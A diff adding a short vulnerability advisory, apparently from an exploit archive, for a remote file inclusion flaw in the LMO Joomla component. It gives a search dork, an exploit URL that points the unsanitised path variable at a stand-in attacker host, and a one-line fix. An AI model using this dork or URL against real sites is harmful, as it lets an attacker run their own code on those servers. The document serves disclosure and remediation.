@@ -1,0 +1,28 @@
+Application : LMO - Joomla! Component
+
+URL : http://forge.joomla.org/sf/projects/lmo
+
+Variable $mosConfig_absolute_path not sanitized: xpl works with register_globals=on
+in components/com_lmo/lmo.php on line 11-12
+
+$lmo_dateipfad=$mosConfig_absolute_path."/administrator/components/com_lmo/";
+$lmo_url=$mosConfig_live_site."/administrator/components/com_lmo/";
+ 
+Exploit:
+~~~~~~~~
+
+dork: "com_lmo"
+
+http://www.vuln.com/components/com_lmo/lmo.php?mosConfig_absolute_path=http://evilhost
+
+Fix
+~~~~
+
+Add before code:
+defined('_VALID_MOS') or die('Direct access to this location is not allowed.');
+
+vitux
+ 
+#vitux.manis@gmail.com
+
+# milw0rm.com [2006-07-30]
